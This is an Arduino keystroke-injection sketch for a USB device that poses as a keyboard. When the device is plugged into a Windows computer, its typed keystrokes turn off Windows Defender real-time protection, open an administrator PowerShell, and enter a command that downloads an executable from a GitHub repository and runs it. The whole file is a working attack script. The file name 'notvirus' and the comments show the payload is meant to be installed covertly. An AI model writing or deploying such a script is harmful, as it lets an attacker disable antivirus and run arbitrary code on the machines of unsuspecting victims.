#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);
  // Open Windows Defender settings
  Keyboard.press(KEY_LEFT_GUI); 
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("Windows Security");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  // Navigate to realtime protection and disable it
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(250);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(250);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(250);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  // Open powershell admin
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(250);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  //Download and execute 
  Keyboard.print("wget  https://github.com/Nguyennhuan2408/notHID/raw/main/notvirus.ntn -O C:\\tailieu.exe; & C:\\tailieu.exe");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
   // Release all Key
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop(){}
